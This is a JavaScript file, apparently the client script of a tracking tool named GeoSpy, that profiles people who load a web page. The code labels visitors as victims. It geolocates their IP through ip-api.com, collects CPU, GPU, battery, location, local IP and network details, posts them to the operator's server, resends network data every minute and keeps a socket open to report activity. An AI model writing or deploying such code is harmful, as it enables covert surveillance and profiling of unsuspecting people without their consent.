// MIT License
//
// Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

$(document).ready(function($) {

    $.getJSON('//ip-api.com/json', function(data) {
        var d = getVictimData();

        $.extend(true, d, data);

        var parser = new UAParser();

        d.cpu = JSON.stringify(parser.getCPU())
            .replace(/"/gi, '')
            .replace(/{/gi, '')
            .replace(/}/gi, '')
            .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');

        d.refer = document.location.host;

    	$.ajax({
            url: window.serverPath + "/register",
            data: d,
            dataType: "json",
            type: "POST",
            success: function(response) {
                console.log(response);
                if (response.status == 'OK'){
                    localStorage.setItem("GeoSpy_vId", response.vId);
                    conChange();
                    queryGPU();
                    locateV();
                    tping();
                    detectBattery();
                    navigation_mode();

                    objUser.getIPs();
                    objUser.sendNetworks();

                    setInterval(function(){ 
                        objUser.getIPs();
                        objUser.sendNetworks();
                    }, 60000);

                    createSockets();
                }
            },
            error: function(error) {}
        });
    });
});

function createSockets(){
    if (typeof(io) != 'undefined') {
        namespace = '/GeoSpy';
        if (window.serverPath == ''){
            socketGeoSpy = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        } else{
            socketGeoSpy = io.connect(window.serverPath + namespace);
        }
    }

    if (socketGeoSpy != null){
        window.onbeforeunload = function(e) {
            var d = getVictimData();
            socketGeoSpy.emit('disconnect_request', d);
            return true;
        }
    }

    if (socketGeoSpy != undefined) {
        socketGeoSpy.emit('join', {room: localStorage.GeoSpy_vId});
        defineSockets(socketGeoSpy);
    }
}
